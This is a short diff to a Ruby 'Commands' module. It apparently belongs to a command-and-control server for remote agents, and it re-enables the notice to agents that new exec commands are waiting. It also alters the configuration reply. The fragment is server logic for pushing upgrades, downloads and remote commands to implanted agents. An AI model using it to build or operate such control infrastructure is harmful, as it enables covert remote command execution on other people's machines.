@@ -103,10 +103,10 @@ module Commands
       available += [PROTO_UPGRADE].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New upgrade"
     end
-    #if DB.instance.new_exec? session[:bid]
-    #  available += [PROTO_EXEC].pack('I')
-    #  trace :info, "[#{peer}][#{session[:cookie]}] Available: New commands exec"
-    #end
+    if DB.instance.new_exec? session[:bid]
+      available += [PROTO_EXEC].pack('I')
+      trace :info, "[#{peer}][#{session[:cookie]}] Available: New commands exec"
+    end
     if DB.instance.new_downloads? session[:bid]
       available += [PROTO_DOWNLOAD].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New downloads"
@@ -148,7 +148,7 @@ module Commands
   # -> PROTO_CONF
   # <- PROTO_NO | PROTO_OK [ Conf ]
   # -> PROTO_CONF [ status ]
-  # <- PROTO_NO | PROTO_OK [ Conf ]
+  # <- PROTO_OK
   def command_conf(peer, session, message)
     trace :info, "[#{peer}][#{session[:cookie]}] Configuration request"
 
@@ -162,7 +162,7 @@ module Commands
       else
         trace :warn, "[#{peer}][#{session[:cookie]}] Agent not able to use the configuration"
       end
-      return [PROTO_OK].pack('I')
+      return [PROTO_OK].pack('I') + [0].pack('I')
     end
 
     # the conf was already retrieved (if any) during the ident phase
